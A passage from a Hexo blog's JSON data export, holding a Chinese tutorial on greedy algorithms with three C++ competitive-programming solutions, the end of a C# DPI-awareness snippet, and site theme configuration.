dar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":423,"excerpt":"","more":"<p>更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    [<span class=\"meta\">STAThread</span>]</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Environment.OSVersion.Version.Major &gt;= <span class=\"number\">6</span>)</span><br><span class=\"line\">            SetProcessDPIAware();</span><br><span class=\"line\"></span><br><span class=\"line\">        Application.EnableVisualStyles();</span><br><span class=\"line\">        Application.SetCompatibleTextRenderingDefault(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        Application.Run(<span class=\"keyword\">new</span> Form1());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    [<span class=\"meta\">System.Runtime.InteropServices.DllImport(<span class=\"meta-string\">&quot;user32.dll&quot;</span>)</span>]</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">extern</span> <span class=\"keyword\">bool</span> <span class=\"title\">SetProcessDPIAware</span>(<span class=\"params\"></span>)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"贪心算法","date":"2019-04-14T14:57:45.000Z","abbrlink":"a4ce31d2","_content":"# 前言\n先奉上一段千古名句：\n<strong>模拟只会猜题意，贪心只能过样例。\n数学上来先打表，DP一般看规律。\n组合数学靠运气，计算几何瞎暴力。\n图论一顿套模板，数论只会GCD。</strong>\n<!--more-->\n# 基本概念\n&emsp;&emsp;所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的<font color=red>局部最优解</font>。\n&emsp;&emsp;贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。\n&emsp;&emsp;<font color=red>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</font>\n# 基本要素\n一、**贪心选择性质**\n&emsp;&emsp;所谓贪心选择性质是指所求问题的总体最优解能够通过一系列局部最优的选择，换句话说，当考虑做何种选择的时候，我们仅仅考虑对当前问题最佳的选择而不考虑子问题的结果。这是贪心算法可行的第一个基本要素。贪心算法以迭代的方式作出相继的贪心选择，每作一次贪心选择就将所求问题简化为规模更小的子问题。\n&emsp;&emsp;对于一个详细问题，要确定它是否具有贪心选择性质，必须证明每一步所作的贪心选择最终导致问题的总体最优解。\n二、**最优子结构性质**\n&emsp;&emsp;当一个问题的最优解包括其子问题的最优解时，称此问题具有最优子结构性质。问题的最优子结构性质是该问题可用贪心算法求解的关键特征。\n# 基本思路\n    1、建立数学模型来描述问题。\n    2、把求解的问题分成若干个子问题。\n    3、对每一子问题求解，得到子问题的局部最优解。\n    4、把子问题的解局部最优解合成原来解问题的一个解。\n# \\*贪心法正确性证明\n&emsp;&emsp;贪心法的正确性证明是个难点，尤其是在非常有限的竞赛时间内。所以，很多选手往往是大胆假设自己选择的贪心策略是正确的，这样难免会出错，但也是一种不得已而为之的办法。其实贪心法的证明虽然不容易，但一些常见的方法还是值得总结的。\n&emsp;&emsp;当一个贪心算法不能确定其100%正确，使用之前就应该尝试证明它的不正确性。而要证明其不正确，一种最简单的方法就是举一个反例。\n# 举例\n## 独木舟\n题目链接：https://www.51nod.com/Challenge/Problem.html#!#problemId=1432\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tlong long N,M;\n\tlong long a[10020];\n\tcin>>N>>M;\n\tfor(int i=0;i<N;i++)\n\t\tcin>>a[i];\n\tsort(a,a+N);\n\tlong long l=0,r=N-1,ans=0;\n\twhile(l<=r)\n\t{\n\t\tif(a[l]+a[r]<=M)\n\t\t\tl++;\n\t\tr--;\n\t\tans++;\n\t}\n\tcout<<ans<<endl;\n\treturn 0;\n}\n```\n## 聪明的木匠\n题目链接：https://www.51nod.com/Challenge/Problem.html#!#problemId=1117\n\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tint N,t,res,ans=0;\n\tcin>>N;\n\tpriority_queue<int,vector<int>,greater<int> >Q;\n\tfor(int i=0;i<N;i++)\n\t{\n\t\tcin>>t;\n\t\tQ.push(t);\n\t}\n\twhile(Q.size()>1)\n\t{\n\t\tres=Q.top();\n\t\tQ.pop();\n\t\tres+=Q.top();\n\t\tQ.pop();\n\t\tQ.push(res);\n\t\tans+=res;\n\t}\n\tcout<<ans<<endl;\n\treturn 0;\n}\n```\n## 不重叠的线段\n题目链接：https://www.51nod.com/Challenge/Problem.html#!#problemId=1133\n```\n#include<bits/stdc++.h>\nusing namespace std;\nstruct demo{int l,r;}line[10020];\nbool cmp(demo a,demo b){return a.r<b.r;}\nint main()\n{\n\tint N,ans=1;\n\tcin>>N;\n\tfor(int i=0;i<N;i++)\n\t\tcin>>line[i].l>>line[i].r;\n\tsort(line,line+N,cmp);\n\tdemo t=line[0];\n\tfor(int i=1;i<N;i++)\n\t{\n\t\tif(t.r<=line[i].l)\n\t\t{\n\t\t\tans++;\n\t\t\tt=line[i];\n\t\t}\n\t}\n\tcout<<ans<<endl;\n\treturn 0;\n}\n```","source":"_posts/贪心.md","raw":"---\ntitle: 贪心算法\ndate: 2019-04-14 22:57:45\ncategories:\n  - Algorithm\ntags: 贪心\nabbrlink: a4ce31d2\n---\n# 前言\n先奉上一段千古名句：\n<strong>模拟只会猜题意，贪心只能过样例。\n数学上来先打表，DP一般看规律。\n组合数学靠运气，计算几何瞎暴力。\n图论一顿套模板，数论只会GCD。</strong>\n<!--more-->\n# 基本概念\n&emsp;&emsp;所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的<font color=red>局部最优解</font>。\n&emsp;&emsp;贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。\n&emsp;&emsp;<font color=red>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</font>\n# 基本要素\n一、**贪心选择性质**\n&emsp;&emsp;所谓贪心选择性质是指所求问题的总体最优解能够通过一系列局部最优的选择，换句话说，当考虑做何种选择的时候，我们仅仅考虑对当前问题最佳的选择而不考虑子问题的结果。这是贪心算法可行的第一个基本要素。贪心算法以迭代的方式作出相继的贪心选择，每作一次贪心选择就将所求问题简化为规模更小的子问题。\n&emsp;&emsp;对于一个详细问题，要确定它是否具有贪心选择性质，必须证明每一步所作的贪心选择最终导致问题的总体最优解。\n二、**最优子结构性质**\n&emsp;&emsp;当一个问题的最优解包括其子问题的最优解时，称此问题具有最优子结构性质。问题的最优子结构性质是该问题可用贪心算法求解的关键特征。\n# 基本思路\n    1、建立数学模型来描述问题。\n    2、把求解的问题分成若干个子问题。\n    3、对每一子问题求解，得到子问题的局部最优解。\n    4、把子问题的解局部最优解合成原来解问题的一个解。\n# \\*贪心法正确性证明\n&emsp;&emsp;贪心法的正确性证明是个难点，尤其是在非常有限的竞赛时间内。所以，很多选手往往是大胆假设自己选择的贪心策略是正确的，这样难免会出错，但也是一种不得已而为之的办法。其实贪心法的证明虽然不容易，但一些常见的方法还是值得总结的。\n&emsp;&emsp;当一个贪心算法不能确定其100%正确，使用之前就应该尝试证明它的不正确性。而要证明其不正确，一种最简单的方法就是举一个反例。\n# 举例\n## 独木舟\n题目链接：https://www.51nod.com/Challenge/Problem.html#!#problemId=1432\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tlong long N,M;\n\tlong long a[10020];\n\tcin>>N>>M;\n\tfor(int i=0;i<N;i++)\n\t\tcin>>a[i];\n\tsort(a,a+N);\n\tlong long l=0,r=N-1,ans=0;\n\twhile(l<=r)\n\t{\n\t\tif(a[l]+a[r]<=M)\n\t\t\tl++;\n\t\tr--;\n\t\tans++;\n\t}\n\tcout<<ans<<endl;\n\treturn 0;\n}\n```\n## 聪明的木匠\n题目链接：https://www.51nod.com/Challenge/Problem.html#!#problemId=1117\n\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tint N,t,res,ans=0;\n\tcin>>N;\n\tpriority_queue<int,vector<int>,greater<int> >Q;\n\tfor(int i=0;i<N;i++)\n\t{\n\t\tcin>>t;\n\t\tQ.push(t);\n\t}\n\twhile(Q.size()>1)\n\t{\n\t\tres=Q.top();\n\t\tQ.pop();\n\t\tres+=Q.top();\n\t\tQ.pop();\n\t\tQ.push(res);\n\t\tans+=res;\n\t}\n\tcout<<ans<<endl;\n\treturn 0;\n}\n```\n## 不重叠的线段\n题目链接：https://www.51nod.com/Challenge/Problem.html#!#problemId=1133\n```\n#include<bits/stdc++.h>\nusing namespace std;\nstruct demo{int l,r;}line[10020];\nbool cmp(demo a,demo b){return a.r<b.r;}\nint main()\n{\n\tint N,ans=1;\n\tcin>>N;\n\tfor(int i=0;i<N;i++)\n\t\tcin>>line[i].l>>line[i].r;\n\tsort(line,line+N,cmp);\n\tdemo t=line[0];\n\tfor(int i=1;i<N;i++)\n\t{\n\t\tif(t.r<=line[i].l)\n\t\t{\n\t\t\tans++;\n\t\t\tt=line[i];\n\t\t}\n\t}\n\tcout<<ans<<endl;\n\treturn 0;\n}\n```","slug":"贪心","published":1,"updated":"2020-05-11T09:45:38.836Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexke70042qse5hvl3feu1","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>先奉上一段千古名句：<br><strong>模拟只会猜题意，贪心只能过样例。<br>数学上来先打表，DP一般看规律。<br>组合数学靠运气，计算几何瞎暴力。<br>图论一顿套模板，数论只会GCD。</strong><br><a id=\"more\"></a></p>\n<h1 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h1><p>&emsp;&emsp;所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的<font color=red>局部最优解</font>。<br>&emsp;&emsp;贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。<br>&emsp;&emsp;<font color=red>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</font></p>\n<h1 id=\"基本要素\"><a href=\"#基本要素\" class=\"headerlink\" title=\"基本要素\"></a>基本要素</h1><p>一、<strong>贪心选择性质</strong><br>&emsp;&emsp;所谓贪心选择性质是指所求问题的总体最优解能够通过一系列局部最优的选择，换句话说，当考虑做何种选择的时候，我们仅仅考虑对当前问题最佳的选择而不考虑子问题的结果。这是贪心算法可行的第一个基本要素。贪心算法以迭代的方式作出相继的贪心选择，每作一次贪心选择就将所求问题简化为规模更小的子问题。<br>&emsp;&emsp;对于一个详细问题，要确定它是否具有贪心选择性质，必须证明每一步所作的贪心选择最终导致问题的总体最优解。<br>二、<strong>最优子结构性质</strong><br>&emsp;&emsp;当一个问题的最优解包括其子问题的最优解时，称此问题具有最优子结构性质。问题的最优子结构性质是该问题可用贪心算法求解的关键特征。</p>\n<h1 id=\"基本思路\"><a href=\"#基本思路\" class=\"headerlink\" title=\"基本思路\"></a>基本思路</h1><pre><code>1、建立数学模型来描述问题。\n2、把求解的问题分成若干个子问题。\n3、对每一子问题求解，得到子问题的局部最优解。\n4、把子问题的解局部最优解合成原来解问题的一个解。\n</code></pre><h1 id=\"贪心法正确性证明\"><a href=\"#贪心法正确性证明\" class=\"headerlink\" title=\"*贪心法正确性证明\"></a>*贪心法正确性证明</h1><p>&emsp;&emsp;贪心法的正确性证明是个难点，尤其是在非常有限的竞赛时间内。所以，很多选手往往是大胆假设自己选择的贪心策略是正确的，这样难免会出错，但也是一种不得已而为之的办法。其实贪心法的证明虽然不容易，但一些常见的方法还是值得总结的。<br>&emsp;&emsp;当一个贪心算法不能确定其100%正确，使用之前就应该尝试证明它的不正确性。而要证明其不正确，一种最简单的方法就是举一个反例。</p>\n<h1 id=\"举例\"><a href=\"#举例\" class=\"headerlink\" title=\"举例\"></a>举例</h1><h2 id=\"独木舟\"><a href=\"#独木舟\" class=\"headerlink\" title=\"独木舟\"></a>独木舟</h2><p>题目链接：<a href=\"https://www.51nod.com/Challenge/Problem.html#!#problemId=1432\">https://www.51nod.com/Challenge/Problem.html#!#problemId=1432</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tlong long N,M;</span><br><span class=\"line\">\tlong long a[10020];</span><br><span class=\"line\">\tcin&gt;&gt;N&gt;&gt;M;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t\tcin&gt;&gt;a[i];</span><br><span class=\"line\">\tsort(a,a+N);</span><br><span class=\"line\">\tlong long l&#x3D;0,r&#x3D;N-1,ans&#x3D;0;</span><br><span class=\"line\">\twhile(l&lt;&#x3D;r)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(a[l]+a[r]&lt;&#x3D;M)</span><br><span class=\"line\">\t\t\tl++;</span><br><span class=\"line\">\t\tr--;</span><br><span class=\"line\">\t\tans++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"聪明的木匠\"><a href=\"#聪明的木匠\" class=\"headerlink\" title=\"聪明的木匠\"></a>聪明的木匠</h2><p>题目链接：<a href=\"https://www.51nod.com/Challenge/Problem.html#!#problemId=1117\">https://www.51nod.com/Challenge/Problem.html#!#problemId=1117</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,t,res,ans&#x3D;0;</span><br><span class=\"line\">\tcin&gt;&gt;N;</span><br><span class=\"line\">\tpriority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;Q;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcin&gt;&gt;t;</span><br><span class=\"line\">\t\tQ.push(t);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\twhile(Q.size()&gt;1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tres&#x3D;Q.top();</span><br><span class=\"line\">\t\tQ.pop();</span><br><span class=\"line\">\t\tres+&#x3D;Q.top();</span><br><span class=\"line\">\t\tQ.pop();</span><br><span class=\"line\">\t\tQ.push(res);</span><br><span class=\"line\">\t\tans+&#x3D;res;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"不重叠的线段\"><a href=\"#不重叠的线段\" class=\"headerlink\" title=\"不重叠的线段\"></a>不重叠的线段</h2><p>题目链接：<a href=\"https://www.51nod.com/Challenge/Problem.html#!#problemId=1133\">https://www.51nod.com/Challenge/Problem.html#!#problemId=1133</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">struct demo&#123;int l,r;&#125;line[10020];</span><br><span class=\"line\">bool cmp(demo a,demo b)&#123;return a.r&lt;b.r;&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,ans&#x3D;1;</span><br><span class=\"line\">\tcin&gt;&gt;N;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t\tcin&gt;&gt;line[i].l&gt;&gt;line[i].r;</span><br><span class=\"line\">\tsort(line,line+N,cmp);</span><br><span class=\"line\">\tdemo t&#x3D;line[0];</span><br><span class=\"line\">\tfor(int i&#x3D;1;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(t.r&lt;&#x3D;line[i].l)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tans++;</span><br><span class=\"line\">\t\t\tt&#x3D;line[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"se